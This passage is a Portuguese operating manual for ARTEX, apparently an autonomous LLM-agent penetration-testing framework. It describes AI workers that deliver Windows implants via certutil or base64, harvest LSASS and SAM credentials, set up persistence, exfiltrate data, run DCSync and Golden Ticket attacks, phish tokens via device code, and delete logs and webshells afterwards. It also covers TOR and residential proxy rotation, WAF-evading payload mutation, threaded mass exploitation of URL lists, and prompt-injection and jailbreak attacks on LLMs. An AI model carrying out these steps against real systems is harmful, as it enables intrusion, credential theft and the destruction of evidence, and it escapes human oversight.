# ARTEX — Manual Operacional

> Versão do documento: 2026-10-29 | Plataforma alvo: WSL Parrot OS (Windows 11)
> Usuário principal: Maik — engajamentos red-team autorizados

---

## 1. Visão Geral da Arquitetura

### Stack

| Camada | Tecnologia |
|--------|-----------|
| Backend | Go 1.26.3 — binário único (`artex`), compilado com `-tags embedui` |
| Frontend | Next.js (exportação estática, embutida no binário via `server/webui/dist/`) |
| Banco de dados | PostgreSQL 16 — armazena todo o estado do sistema |
| Traffic store | SQLite separado (via `traffic/` package) — registros HTTP brutos do MITM |
| LLM | Qualquer provider OpenAI-compatible (DeepSeek, Claude, OpenAI, Ollama) |

### Portas

| Porta | Função | Acessível de |
|-------|--------|-------------|
| `:8787` | UI + JSON API completa | Browser Windows (`localhost:8787`) |
| `:8788` | MITM proxy HTTP/HTTPS (recording) | `127.0.0.1:8788` — WSL-local |

### Agentes

O sistema tem seis papéis de agente distintos, todos configuráveis via UI:

| Agente | Função |
|--------|--------|
| `goals` | Decompõe o goal do task em objetivos verificáveis e extrai constraints operacionais |
| `mainagent` | Interface humana — observa o grafo, esteriza workers, responde ao chat |
| `planner` | Gerador de intents — acorda por evento, lê o grafo, emite 0..N intents para o frontier |
| `worker` | Executa intents — N instâncias paralelas, cada uma com seu próprio transcript |
| `auto` | Agente de relatório automático — registra findings, insere assets, cuida do scope |
| `pentest` | Agente solo opcional — executa pentest de ponta a ponta sem planner separado |

### Modelo de Dados (PostgreSQL)

```
companies
  └── assets (domínios, endpoints, IPs, secrets, etc.)
        └── explorations (uma por task — contém o grafo completo)
              ├── exploration_nodes (goals, intents, facts, findings)
              ├── exploration_edges (relações entre nós)
              ├── findings (vulns confirmadas: severity, vulnclass, exploit_chain)
              └── task_credentials (contas de teste por task)
```

Chave de configuração adicional:

- `llm_profiles` — perfis de LLM (provider, model, key, base_url)
- `agent_prompts` — prompts editáveis por agente (seção [A] editável, cauda em código)
- `intercept_pending` — tool calls aguardando aprovação do operador
- `proxygraph_nodes` / `proxygraph_config` — pool de proxies e política de rotação

---

## 2. Instalação no WSL Parrot

### Pré-requisitos (lado Windows)

- WSL 2 ativado: `wsl --install` ou `wsl --set-default-version 2`
- Parrot Security ou Parrot Home instalado como distro WSL
- Arquivos do projeto em `C:\Users\error\Desktop\ARTEX-main\ARTEX-main`

O instalador cuida de todo o resto automaticamente.

### Instalação completa (one-shot)

```bash
# Abrir shell Parrot WSL:
wsl -d Parrot

# Navegar ao projeto via DrvFs:
cd /mnt/c/Users/error/Desktop/ARTEX-main/ARTEX-main

# Executar o instalador:
bash scripts/install-wsl-parrot.sh
```

O instalador executa estas etapas na ordem:

| Etapa | Detalhe |
|-------|---------|
| Go 1.26.3 | Download de `https://go.dev/dl/` → `/usr/local/go`. Parrot repos têm Go antigo. |
| Node.js 22 | Via NodeSource (`setup_22.x`). Next.js 16 exige Node ≥ 20. |
| PostgreSQL 16 | `apt-get install postgresql-16`. Cria role `artex` + database `artex`. |
| rsync | Necessário para sincronizar `web/out/` → `server/webui/dist/`. |
| Build frontend | `cd web && npm ci && npm run build:static` — exportação estática Next.js. 1–3 min. |
| Compilação Go | `CGO_ENABLED=0 go build -tags embedui ./cmd/artex` — binário autocontido. |
| config.json | Escreve credenciais do DB no `config.json` da raiz do projeto. |

**Salve a senha do PostgreSQL** impressa ao final — ela é aleatória e não recuperável.

### Variáveis de ambiente

Adicione ao `~/.bashrc` para persistir entre reinicializações WSL:

```bash
# LLM — escolha uma opção:

# Opção A: DeepSeek (recomendado para red-team — custo baixo)
export DEEPSEEK_API_KEY="sk-..."
export ARTEX_LLM_PROVIDER="deepseek"
export ARTEX_LLM_MODEL="deepseek-chat"

# Opção B: Anthropic Claude
export ANTHROPIC_API_KEY="sk-ant-..."

# Opção C: OpenAI
export OPENAI_API_KEY="sk-..."
export ARTEX_LLM_PROVIDER="openai"
export ARTEX_LLM_MODEL="gpt-4o"

# Opção D: Ollama local (Windows host)
export ARTEX_LLM_PROVIDER="ollama"
export ARTEX_LLM_MODEL="llama3.1"
export ARTEX_LLM_BASE_URL="http://$(ip route show default | awk '{print $3}'):11434"

# Config e skills (opcional se o default funcionar):
export ARTEX_CONFIG="/mnt/c/Users/error/Desktop/ARTEX-main/ARTEX-main/config.json"
export ARTEX_SKILL_DIR="/mnt/c/Users/error/Desktop/ARTEX-main/ARTEX-main/skills"
```

### Symlink do CLAUDE.md (integração Ksir)

```bash
mkdir -p ~/.claude
ln -sf /mnt/c/Users/error/.claude/CLAUDE.md ~/.claude/CLAUDE.md
```

### Iniciar o ARTEX

```bash
bash scripts/run-artex.sh
```

O script inicia o PostgreSQL se não estiver rodando e carrega o `.env` se existir. Você verá o banner:

```
    _    ____ _____ _______  __
   / \  |  _ \_   _| ____\ \/ /
  / _ \ | |_) || | |  _|  \  /
 / ___ \|  _ < | | | |___ /  \
/_/   \_\_| \_\|_| |_____/_/\_\

  AI autonomous penetration testing system
  version 0.4.0  ·  linux/amd64  ·  go1.26.3  ·  listening on :8787
```

### Verificação de saúde

```bash
curl http://localhost:8787/api/health
```

Resposta esperada:

```json
{"status":"ok","version":"0.4.0"}
```

---

## 3. Configuração Inicial

### 3.1 LLM (DeepSeek)

**Via UI:**

1. `System → LLM` → botão **New profile**
2. Preencher:
   - **Format:** `deepseek` (ou `openai` para compatibilidade)
   - **Model:** `deepseek-chat` (uso geral) ou `deepseek-reasoner` (planejamento complexo)
   - **API Key:** `sk-...` (obtida em platform.deepseek.com)
   - **Base URL:** deixar vazio (usa padrão DeepSeek) ou `https://api.deepseek.com`
3. Clicar **Test** — deve retornar `OK` com lista de modelos
4. Clicar **Set as active**

**Via variável de ambiente (alternativa):**

```bash
export DEEPSEEK_API_KEY="sk-..."
export ARTEX_LLM_PROVIDER="deepseek"
export ARTEX_LLM_MODEL="deepseek-chat"
```

**Quando usar `deepseek-reasoner`:**
- Tasks com objetivos complexos e ambíguos
- Planejamento de multi-hop attack chains
- Análise de resultados de recon densos
- O modelo é mais lento e mais caro — use seletivamente por task

**Perfis encadeados (LLM Chain):**
- Cada task pode ter uma cadeia ordenada de perfis: se o primeiro falha N vezes consecutivas, o sistema promove o próximo
- Configurável em `GET /api/tasks/{id}/llm` — permite usar `deepseek-reasoner` como failover do `deepseek-chat`

### 3.2 ProxyGraph (rotação de proxy)

O ProxyGraph fornece um pool de saída para workers e planner — cada subcomando Bash usa um proxy diferente automaticamente (variável `HTTP_PROXY`/`HTTPS_PROXY` injetada no ambiente do subcomando).

**Via UI:** `System → Proxy Graph`

**Adicionar nós:**

```
GET  /api/proxygraph/nodes        — listar nós
POST /api/proxygraph/nodes        — adicionar nó
DELETE /api/proxygraph/nodes/{id} — remover nó
GET  /api/proxygraph/health       — health check do pool
PUT  /api/proxygraph/config       — definir política de rotação
```

**Exemplo — adicionar proxy residencial:**

```bash
curl -X POST http://localhost:8787/api/proxygraph/nodes \
  -H "Content-Type: application/json" \
  -d '{
    "id": "residential-1",
    "url": "http://user:pass@proxy.provider.com:8080",
    "tags": ["residential"]
  }'
```

**Exemplo — adicionar TOR:**

```bash
curl -X POST http://localhost:8787/api/proxygraph/nodes \
  -H "Content-Type: application/json" \
  -d '{
    "id": "tor-1",
    "url": "socks5://127.0.0.1:9050",
    "tags": ["tor"]
  }'
```

**Políticas disponíveis:**

| Política | Comportamento |
|----------|--------------|
| `round_robin` | Rotação sequencial entre todos os nós ativos |
| `asn_diverse` | Prioriza nós com ASNs diferentes nos últimos N requests |
| `least_used` | Prefere o nó com menor contagem de uso |

**Definir política:**

```bash
curl -X PUT http://localhost:8787/api/proxygraph/config \
  -H "Content-Type: application/json" \
  -d '{"policy": "asn_diverse"}'
```

O health check roda automaticamente — nós que falham são excluídos da rotação.

### 3.3 C2 Bridge

O C2 Bridge gerencia o staging e delivery de implants Windows para o worker. Configurado via variáveis de ambiente no ambiente WSL:

```bash
# Caminho do implant x64 pré-compilado:
export ARTEX_C2_BIN_X64="/opt/implants/svc_x64.exe"

# Diretório de staging (servidor HTTP simples que o worker sobe):
export ARTEX_C2_STAGING_DIR="/tmp/artex-staging"
```

**Sequência de uso pelo worker:**

```
1. check_edr(target)           — identifica EDR antes de entregar qualquer payload
2. c2_stage_implant(arch=x64)  — verifica binário presente localmente
3. c2_deliver_implant(...)     — gera comando de delivery; executa via shell/exec
4. c2_await_operator(...)      — handoff — operador assume a sessão
```

Detalhe completo na Seção 8 (ferramentas) e Seção 9 (skill `c2-handoff`).

---

## 4. Criando um Engajamento (Task)

### 4.1 Pelo UI

1. `Function → Tasks` → botão **New Task**
2. Preencher dois campos:
   - **Description:** contexto completo do engajamento — stack tech conhecida, scope, o que está fora de scope, credenciais fornecidas pelo programa, restrições operacionais
   - **Goal:** objetivo formal e verificável — o que constitui sucesso

**Validação automática de goal:**
- Goals sem target nomeado são rejeitados (use `[targetless]` para opt-out)
- Goals com menos de 80 caracteres são rejeitados — seja específico

### 4.2 Pela API

```bash
curl -X POST http://localhost:8787/api/tasks \
  -H "Content-Type: application/json" \
  -d '{
    "description": "Alvo: https://app.target.com — Stack: Next.js + Node.js backend em AWS ECS. WAF Cloudflare ativo. Scope: qualquer subdomínio de target.com. Fora de scope: bancos de dados de produção, ações destrutivas. Modo: black-box, sem credenciais fornecidas.",
    "goal": "Obter RCE no servidor backend de https://app.target.com ou demonstrar acesso admin autenticado ao painel /admin com evidência de SSRF ou SQLi confirmada."
  }'
```

Resposta:

```json
{
  "id": "42",
  "exploration_id": 7,
  "description": "...",
  "goal": "...",
  "created_at": 1730246400,
  "paused": false,
  "status": ""
}
```

O `id` retornado é usado em todos os endpoints subsequentes.

### 4.3 Boas práticas para o prompt de task

**O que incluir na Description:**

```
Alvo principal: https://shop.target.com
Stack identificada (se conhecida): PHP 8.3.x + Laravel, MySQL, nginx, Cloudflare WAF
Subdomínios adicionais em scope: api.target.com, admin.target.com
Credenciais fornecidas pelo programa: usuario=tester@target.com senha=TestPass123!
Informações de background: aplicação de e-commerce, ~50k usuários registrados
Fora de scope: target-internal.com, qualquer ação de delete/drop no banco
Restrições operacionais: sem brute-force em /admin, sem DoS, apenas HTTP/HTTPS
```

**O que incluir no Goal:**

```
Obter shell no servidor web de shop.target.com (qualquer método — LFI→RCE, SQLi→RCE, SSRF→RCE, upload de webshell) OU demonstrar SQLi com extração de 3+ registros de usuário como prova de impacto.
```

**Princípios:**
- Quanto mais contexto na Description → melhor planejamento do Planner
- Um Goal claro e verificável evita que o agente vague sem direção
- Constraints explícitas na Description são extraídas automaticamente pelo decompositor de goals (`goals` agent) e injetadas nos prompts de worker/planner

---

## 5. Fluxo Interno de Execução

### Sequência completa

```
CreateTask (POST /api/tasks)
  │
  ▼
Goals Agent — decompõe goal em objetivos, extrai constraints, registra scope
  │
  ▼
Engine — loop de execução event-driven
  │
  ├─ Planner (acorda por evento: asset change / finding / hint / heartbeat)
  │    ├─ Lê exploration graph (goals, facts, findings, assets)
  │    ├─ Julga se goals estão completos → se sim, task vai para completed
  │    └─ Emite 0..N intents no frontier (cada intent = uma direção de exploração)
  │
  └─ Workers (N paralelos, configurável)
       ├─ Claimam intents do frontier
       ├─ Executam com tools disponíveis (Bash, Read, Write, ferramentas de domínio, skills MCP)
       ├─ Reportam findings via add_finding, assets via insert_assets
       └─ Ao terminar: notificam o Engine → Engine debounce → Planner acorda
```

### Como o Planner gera intents

O Planner recebe como contexto:
- Todos os goals com status (met / unmet)
- Todos os facts, findings e assets do grafo
- Hints adicionados pelo operador via chat
- Constraints registradas
- Aviso de stagnação quando o mesmo vetor foi tentado sem finding novo

Ele decide:
- Quais goals faltam ser comprovados
- Qual vetor de ataque tem maior probabilidade de sucesso dado o estado atual
- Quantos workers paralelizar (dentro da concorrência configurada)

Cada intent tem priority (0–10). O MainAgent pode injetar intents com prioridade 8–10 para execução imediata.

### PolyEngine — mutação automática de payload

Quando um tool call retorna uma rejeição WAF/target (detectada pelo `PolyEngine`):

1. O `PolyEngine` intercepta o resultado dentro de `AugmentTools`
2. Aplica a camada determinística WAFFLED (7 mutadores, em ciclo):

| Geração | Mutador | Operação |
|---------|---------|---------|
| gen%7 == 0 | W — Whitespace | Variação de espaços e newlines no payload |
| gen%7 == 1 | A — Alternate encoding | URL-encode alternativo, Unicode equivalents |
| gen%7 == 2 | F — Fragment substitution | Substitui tokens por equivalentes fragmentados |
| gen%7 == 3 | F2 — Function wrap | Envolve payload em funções equivalentes |
| gen%7 == 4 | L — Line comment | Injeta comentários de linha (`--`, `#`, `//`) |
| gen%7 == 5 | E — Double encode | Dupla codificação URL/HTML |
| gen%7 == 6 | D — Deadcode | Injeta código morto que não muda o resultado |

3. Máximo de 5 gerações (`MaxGens: 5`) antes de declarar bloqueio
4. Rejeição de scope (`RejectionScope`) para imediatamente — sem retry

**proxyEnvRotated:** cada subcomando Bash recebe automaticamente `HTTP_PROXY` e `HTTPS_PROXY` injetados com o próximo proxy da rotação do ProxyGraph. O MITM proxy (`:8788`) é configurado como proxy de recording para WebFetch do mainagent e planner.

---

## 6. Monitoramento em Tempo Real

### Tabs da Task

Acesse qualquer task via `Function → Tasks → [task ID]`. Tabs disponíveis:

**Sessions**
- Transcript ao vivo de cada worker e do planner
- Cada tool call expansível com input/output completo
- Mostra thinking, tool_use, tool_result, text em sequência

**Graph**
- Árvore visual do raciocínio: goals → intents → facts → findings
- Nós coloridos por tipo; edges mostram dependências
- Estado dos goals (met/unmet) visível em tempo real

**Findings**
- Vulns confirmadas ordenadas por severity (Critical > High > Medium > Low > Info)
- Cada finding: título, description, severity, vulnclass, exploit_chain, prova de impacto
- Botão "Deepen" relança um worker para aprofundar o finding
- Botão "Retest" verifica se o finding ainda existe

**Credentials**
- Contas de teste coletadas pelo agente (`save_task_credential`)
- Domínio, username, password, nota contextual
- Gerenciadas também em `GET /api/tasks/{id}/credentials`

**Assets**
- Todos os ativos descobertos: domínios, endpoints, IPs, secrets, storage buckets
- Filtráveis por kind e by status (tested/untested quando coverage está ativo)

**Traffic**
- HTTP bruto capturado pelo MITM proxy (`:8788`)
- Filtrável por host
- Cada exchange: request headers/body + response headers/body

**Intercept**
- Tool calls pendentes aguardando aprovação do operador (Advisor Mode)
- Para ativar: `System → Command Interception → enable`
- Regras built-in bloqueiam endpoints destrutivos (DELETE, `/delete`, `/remove`, etc.)

**Report**
- Relatório curado final gerado pelo Auto agent
- Inclui: executive summary, findings ordenados, evidências, recomendações

### Activity Stream (SSE — Server-Sent Events)

Para monitorar tudo em tempo real via terminal:

```bash
curl -N http://localhost:8787/api/exploration/activity/stream
```

Histórico recente:

```bash
curl http://localhost:8787/api/exploration/activity/history
```

Detalhe de um evento específico:

```bash
curl http://localhost:8787/api/exploration/activity/{seq}
```

### Logs do sistema

```bash
# Stream ao vivo:
curl -N http://localhost:8787/api/logs/stream

# Histórico:
curl http://localhost:8787/api/logs/history

# Último snapshot:
curl http://localhost:8787/api/logs
```

---

## 7. Chat com o MainAgent — Comandos Úteis

### Como funciona

O MainAgent é a interface humana do sistema. Ele:
- NÃO executa exploração diretamente
- NÃO gera intents em loop (isso é o Planner)
- Observa o grafo com `graph_overview`, `list_findings`, `list_facts`, `list_assets`, `get_worker_output`
- Esteriza os workers via `add_hint` (próxima rodada) ou `add_intent` (imediato, prioridade 8–10)
- Redireciona um worker em execução via `steer_work` (sem interromper o progresso)

**Endpoint de chat:**

```bash
curl -X POST http://localhost:8787/api/chat \
  -H "Content-Type: application/json" \
  -d '{"message": "O que encontramos até agora?", "task_id": 42}'
```

### Comandos práticos

**Consultando progresso:**

```
"O que encontramos até agora?"
→ MainAgent chama graph_overview e list_findings, resume o estado atual

"Quantas goals foram cumpridas?"
→ Lista goals met/unmet do grafo

"Quais assets foram descobertos?"
→ Lista domínios, endpoints, IPs do asset store
```

**Direcionando o próximo passo:**

```
"Foca no SQLi encontrado em /api/products?id="
→ add_hint ao planner: próxima rodada prioriza essa vulnerabilidade

"Explora o LFI em /download.php até RCE via session.upload_progress"
→ add_intent de alta prioridade (9) com essa direção específica

"O alvo tem PHP 8.3.x, testa CVE-2026-109618"
→ add_intent com skill php2shell e versão confirmada
```

**Curso-correção em tempo real:**

```
"Para de tentar SQLi no login, o WAF está bloqueando tudo — muda para o endpoint /api/search"
→ steer_work no intent em execução, sem perder progresso

"Esse worker está rodando na direção errada — cancela e lança um novo no /api/admin"
→ O MainAgent cancela o intent e lança add_intent com nova direção
```

**Post-exploitation:**

```
"Colhe creds da memória e verifica movimento lateral para a subnet 10.10.1.0/24"
→ Lança intent com skill lateral-movement, fases 1-3

"Verifica se tem EDR antes de entregar o implant"
→ add_intent com check_edr antes do c2_stage_implant

"Limpa todos os artifacts — log history, binários em /tmp, webshells"
→ Lança cleanup_artifacts em todos os hosts comprometidos
```

**Metas novas:**

```
"Adiciona um novo goal: comprometer o banco de dados e extrair 10 registros de usuário"
→ MainAgent chama set_goals — task volta a running automaticamente

"Para tudo e coloca em pausa"
→ Pausa via POST /api/tasks/42/control {"action": "pause"}
```

---

## 8. Ferramentas Disponíveis para os Workers

Os workers recebem as ferramentas SDK padrão mais as ferramentas de domínio ARTEX. Ferramentas SDK estão sempre disponíveis:

| Ferramenta SDK | Uso |
|---------------|-----|
| `Bash` | Execução de comandos shell — nmap, sqlmap, ffuf, nuclei, etc. |
| `Read` | Leitura de arquivos no host |
| `Write` | Escrita de arquivos no host |
| `Edit` | Edição pontual de arquivos |
| `Grep` | Busca de padrão em arquivos |
| `Glob` | Busca de arquivos por padrão |

### Ferramentas de domínio ARTEX (workers)

**Gestão de findings:**

| Ferramenta | Função |
|-----------|--------|
| `add_finding` | Reporta uma vulnerabilidade confirmada com severity, exploit_chain e prova |
| `list_findings` | Lista findings existentes — evita duplicatas |

**Gestão de assets:**

| Ferramenta | Função |
|-----------|--------|
| `insert_assets` | Registra ativos descobertos (domínios, endpoints, IPs, secrets, storage) |
| `list_assets` | Lista assets registrados para o contexto atual |
| `list_companies` | Lista companies/projetos no sistema |
| `add_company_scope` | Adiciona scope a uma company |

**Credenciais:**

| Ferramenta | Função |
|-----------|--------|
| `save_task_credential` | Salva conta de teste (domínio, username, senha) — obrigatório chamar imediatamente após registrar conta no alvo |
| `list_task_credentials` | Lista contas disponíveis — verificar antes de registrar nova |

**Goals e planejamento:**

| Ferramenta | Função |
|-----------|--------|
| `set_goals` | Define/atualiza goals decompostos do task |
| `set_constraints` | Registra constraints operacionais (allow/deny) |
| `add_hint` | Injeta hint estratégico para o próximo round do planner |
| `add_intent` | Injeta intent de alta prioridade imediato no frontier |
| `prove_goal` | Marca um goal como cumprido com evidência |
| `steer_work` | Redireciona um worker em execução (sem interromper) |
| `get_worker_output` | Lê o transcript ao vivo de um worker específico |
| `graph_overview` | Retorna estado completo do grafo (goals, facts, findings, assets) |
| `list_facts` | Lista facts registrados no grafo |

**C2 e pós-exploração:**

| Ferramenta | Função |
|-----------|--------|
| `c2_stage_implant` | Verifica/prepara implant no diretório de staging local |
| `c2_deliver_implant` | Gera sequência de entrega do implant via vetor escolhido (echo_b64, certutil, wget, webshell_upload) |
| `c2_await_operator` | Registra handoff — pausa até o operador tomar controle |
| `check_edr` | Detecta EDR instalado no host comprometido (probing de processos/serviços) |
| `cleanup_artifacts` | Remove payload, dumps e logs de evidência do host alvo |
| `deploy_payload` | Deploy de payload no host alvo |
| `establish_persistence` | Registra mecanismo de persistência (run key, scheduled task, service) |
| `exfiltrate` | Exfiltração de dados do host para staging local |
| `exfil_data` | Exfiltração inline de dados específicos |

**Movimento lateral:**

| Ferramenta | Função |
|-----------|--------|
| `lateral_scan` | Enumeração de hosts e serviços na subnet a partir do foothold |
| `harvest_credentials` | Coleta de credenciais (LSASS, SAM, DPAPI, Kerberos tickets) |
| `move_lateral` | Movimento lateral para host alvo com credenciais colhidas |
| `escalate_privilege` | Escalação de privilégio local (token stealing, service hijack, UAC bypass, potato) |
| `domain_escalate` | Escalação de domínio (DCSync, Golden Ticket, GPO abuse, Kerberoast) |

**Cloud:**

| Ferramenta | Função |
|-----------|--------|
| `enumerate_oidc_chain` | Enumeração de chain de trust OIDC/OAuth |
| `query_imds` | Query do Instance Metadata Service (AWS IMDSv1/v2, Azure IMDS) |
| `extract_tf_state` | Extração de terraform.tfstate de storage exposto |
| `device_code_init` | Inicia flow OAuth device code para phishing de tokens |
| `check_mfa_methods` | Enumera métodos MFA configurados na conta |

---

## 9. Skills Library — Técnicas Disponíveis

Skills são módulos de conhecimento carregados pelo worker via ferramenta `Skill`. Ficam em `skills/` na raiz do projeto. Cada skill tem um `SKILL.md` com doutrina, comandos e payloads.

### php2shell

**O que cobre:** PHP Session Upload Progress — LFI→RCE em escala. Três chains de exploração.

**Quando usar:** Alvo com PHP detectado, LFI confirmada ou suspeita, phpinfo() acessível.

**CVEs:**
- CVE-2026-115560 — `session.upload_progress.enabled=On` (PHP default, sem patch)
- CVE-2026-109618/9 — PHP < 8.2.35/8.3.36/8.4.27/8.5.12 (CISA KEV, patched Oct 2026)

**Chains:**
- Chain 1: session.upload_progress (PHP 5.4.0–8.5.11, target default config)
- Chain 2: var_destroy UAF (PHP 7.0–7.4 específico)
- Chain 3: Serializer mismatch (PHP com config mixed)

**Cluster mode:**

```bash
# Scan
python skills/php2shell/cluster/scanner.py --targets urls.txt --threads 50

# Exploit
python skills/php2shell/cluster/exploit.py --targets scan_results.json --chain 1 --threads 20

# Verify
python skills/php2shell/cluster/verifier.py --shells shells.json
```

---

### passive-recon

**O que cobre:** Pipeline completo de recon passivo — 10 etapas encadeadas, MITRE-tagueadas.

**Quando usar:** Início de qualquer engajamento black-box. Rodar ANTES de qualquer probe ativo.

**Etapas:**

| Passo | Ferramenta | Objetivo |
|-------|-----------|---------|
| 1 | subfinder, amass, crt.sh | Enumeração passiva de subdomínios |
| 2 | httpx, wappalyzer-cli | Fingerprint de stack tech em hosts vivos |
| 3 | ffuf, feroxbuster | Content discovery com wordlist ajustada à stack |
| 4 | ffuf, nuclei | API discovery: REST, GraphQL, Swagger |
| 5 | Google dorks | Exposições passivas em índice público |
| 6 | katana, hakrawler | JS mining — endpoints e secrets hardcoded |
| 7 | asnlookup, bgpview | Mapeamento de blocos IP por ASN |
| 8 | cloud_enum | Cloud bucket hunting (S3, Azure Blob, GCS) |
| 9 | ffuf + SSTI payloads | Probe de template injection em parâmetros |
| 10 | trufflehog, gitleaks | Secret scan em repos públicos |

Todos os outputs alimentam a fase ANALYZE. Prioridade: qualquer credential exposta ou SSTI hit → escalação imediata.

---

### google-dorking

**O que cobre:** 185+ dorks organizados em 11 categorias para OSINT passivo. Zero contato direto com o alvo.

**Quando usar:** Fase inicial de recon, busca de exposições em índice Google, cloud buckets, repos públicos.

**Categorias:**

| # | Arquivo | Dorks | Superfície |
|---|---------|-------|-----------|
| 1 | sensitive_files.txt | 39 | .env, .sql, .bak, chaves PEM, backups |
| 2 | source_code.txt | 17 | .git exposto, wp-config, IDE configs |
| 3 | admin_panels.txt | 15 | Painéis de admin, CMS, Kibana, Grafana, Jenkins |
| 4 | api_endpoints.txt | 13 | REST APIs, GraphQL, Swagger, Spring Actuator |
| 5 | infrastructure.txt | 14 | Directory listings, stack traces, SQL errors |
| 6 | cloud_storage.txt | 23 | S3, Azure Blob, GCS, Firebase, GitHub leaks |
| 7 | subdomains.txt | 10 | dev, staging, test, beta, legacy, preprod |
| 8 | credentials.txt | 14 | AWS keys (AKIA), SSH keys, OAuth tokens |
| 9 | vuln_params.txt | 25 | SQLi, LFI, XSS, SSRF, IDOR params |
| 10 | cms_specific.txt | 17 | WordPress, Joomla, Drupal, Laravel, Django |
| 11 | combined_advanced.txt | 11 | Multi-extension mega-dorks, combos boolean |

---

### lateral-movement

**O que cobre:** Playbook pós-exploração de 5 fases com EDR catalog por produto e técnica de detecção.

**Quando usar:** Foothold obtido — mover para outros hosts, escalar privilégio, comprometer domínio.

**Fases:**

| Fase | Tool ARTEX | Ação |
|------|-----------|------|
| 1 — Enumeration | `lateral_scan` | net view, nmap subnet, BloodHound, LDAP enum, share enum |
| 2 — Credential Collection | `harvest_credentials` | LSASS dump, SAM, NTDS.dit, DPAPI, Kerberoast, AS-REP roast |
| 3 — Lateral Movement | `move_lateral` | WMI, WinRM, SMB/PsExec, SSH, DCOM, RDP |
| 4 — Privilege Escalation | `escalate_privilege` | Token stealing, service hijack, UAC bypass, Potato family, kernel exploits |
| 5 — Domain Domination | `domain_escalate` | DCSync, Golden Ticket, Kerberoasting, GPO abuse |

**Sempre:**
- `check_edr` antes de qualquer payload delivery
- `cleanup_artifacts` após cada fase

**EDR Catalog:**

| Produto | Processo-chave |
|---------|---------------|
| Microsoft Defender / MDE | MsMpEng.exe, MsSense.exe |
| CrowdStrike Falcon | CSFalconService.exe, CSAgent.exe |
| SentinelOne | SentinelAgent.exe |
| Carbon Black | CbDefense.exe |
| Palo Alto Cortex XDR | cortex-xdr-agent.exe |
| ESET | ekrn.exe, egui.exe |
| Sophos | SAVService.exe |

---

### c2-handoff

**O que cobre:** Delivery de implant Windows via shell já obtida. Sem API de RAT — apenas staging e entrega.

**Quando usar:** Shell obtida (PHP webshell, RCE, SSH) → deliver implant Windows e passar controle ao operador.

**Vetores de delivery por tipo de shell:**

| Shell | Vetor recomendado |
|-------|------------------|
| webshell_php | webshell_upload — POST multipart pelo endpoint |
| rce_cmd | echo_b64 — certutil sempre presente no Windows |
| sqli_exec | echo_b64 — xp_cmdshell/OPENROWSET, contexto cmd |
| ssh | wget ou curl — Linux/Unix com ferramentas padrão |
| rce_powershell | certutil ou bitsadmin |

**Sequência:**

```
1. check_edr(target)                    → operador revisa EDR
2. c2_stage_implant(arch="x64")         → verifica binário local
3. c2_deliver_implant(vector="echo_b64") → executa via shell obtida
4. c2_await_operator(target_host, status) → handoff ao operador
```

---

### waf-bypass

**O que cobre:** Evasão HTTP de WAF (Cloudflare, ModSecurity, Akamai, AWS WAF). 7 técnicas.

**Quando usar:** Response 403/429 ou página de bloqueio WAF em qualquer probe ou exploit.

**Técnicas:**

| Técnica | Quando usar |
|---------|------------|
| IP Spoofing Headers (`X-Forwarded-For`, `X-Real-IP`, `X-Client-IP`) | WAF confia em reverse-proxy headers |
| HTTP Method Mutation (GET→HEAD, POST→PUT/PATCH) | WAF só inspeciona GET/POST |
| Content-Type Mutation (JSON→XML, multipart, text/plain) | WAF faz signature-match por Content-Type |
| Junk Data Padding (8KB+ antes do payload) | WAF tem limite de inspeção por byte |
| User-Agent Rotation (pool 2025-2026) | Evita behavioral detection por UA repetido |
| Referer Spoofing (Google, Bing, DuckDuckGo) | Complementa UA rotation |
| Path Encoding (%252f, Unicode, trailing dot, null byte) | Bypasses de regras CRS por path |

---

### vuln-chaining

**O que cobre:** 9 chains completas de vulnerabilidades encadeadas, do IDOR→ATO ao mobile→backend.

**Quando usar:** Finding isolado de média severidade — encadear até impacto crítico.

**Chains disponíveis:**

| Chain | Rota | Impacto |
|-------|------|---------|
| 1 | IDOR → email change → password reset → ATO | Account takeover de admin |
| 2 | SSRF → file read → config → internal service → RCE | RCE pre-auth |
| 3 | CVE-2025-66478 (Next.js RSC module reference forge) | RCE pre-auth CVSS 10.0 |
| 4 | CVE-2025-61882 (Oracle EBS XSLT injection → SSRF → RCE) | RCE pre-auth |
| 5 | CVE-2025-34291 (Langflow CORS+CSRF → workspace RCE) | RCE autenticado cross-site |
| 6 | CVE-2024-46938 (Sitecore path traversal → web.config → ViewState → .NET RCE) | RCE pre-auth |
| 7 | AWS iam:CreatePolicyVersion → wildcard admin | Full AWS account compromise |
| 8 | AWS iam:PassRole + ec2:RunInstances → cross-role escalation | DA no cloud |
| 9 | Mobile APK → SSL pinning bypass → hardcoded API keys → backend IDOR/priv-esc | Backend full access |

---

### llm-pentest

**O que cobre:** 43+ payloads de prompt injection, 8 categorias de ataque, CVE-2025-32711 (EchoLeak M365 Copilot).

**Quando usar:** Alvo usa LLM em produção (chatbot, RAG, M365 Copilot, Langflow, multi-agent).

**Categorias de ataque:**
1. Direct Override — sobrescrever contexto do modelo em um turno
2. DAN / Roleplay Jailbreaks — substituição de persona
3. System Prompt Extraction — extrair instrução de operador
4. Data Exfiltration — CVE-2025-32711, EchoLeak markdown image exfil
5. Indirect Injection — plantar payloads em documentos/emails/wikis
6. Obfuscation / Filter Bypass — homoglyphs, zero-width chars, multilingual mix
7. Multi-Turn Escalation — Crescendo, Skeleton Key
8. Goal Hijacking / Shadow Agents — redirecionar agentes com tool access

---

### ssti-rce

**O que cobre:** Server-Side Template Injection → RCE em Jinja2, Twig, FreeMarker, Pebble, Velocity com WAF bypass.

**Quando usar:** Parâmetro reflete entrada do usuário em context de template.

---

### http-smuggling

**O que cobre:** HTTP request smuggling — CL.TE, TE.CL, H2.CL, H2.TE, H2C tunnel.

**Quando usar:** Alvo atrás de reverse-proxy/CDN com diferentes parsers de Content-Length/Transfer-Encoding.

---

### proto-pollution-rce

**O que cobre:** Node.js prototype pollution gadgets para RCE (GHunter 2024).

**Quando usar:** Aplicação Node.js com merge/assign de objetos user-controlled.

---

### web-cache-poison

**O que cobre:** Web cache poisoning — unkeyed header injection e Web Cache Deception (WCD).

**Quando usar:** Alvo com CDN/cache que reflete headers não-keyed ou serve respostas por path ambíguo.

---

### oidc-trust-abuse

**O que cobre:** Abuso de chain de trust OIDC — device code phishing, token downgrade, cross-tenant confusion.

---

### azure-identity-chain

**O que cobre:** Escalação via Managed Identity, Service Principal, RBAC misconfiguration, az cli token theft.

---

### cicd-injection

**O que cobre:** Injeção em pipelines CI/CD (GitHub Actions, GitLab CI, Jenkins) via environment variables e secrets exfil.

---

### osint-identity

**O que cobre:** OSINT de identidades — correlação de emails, usernames, perfis, credenciais vazadas.

---

### api-security

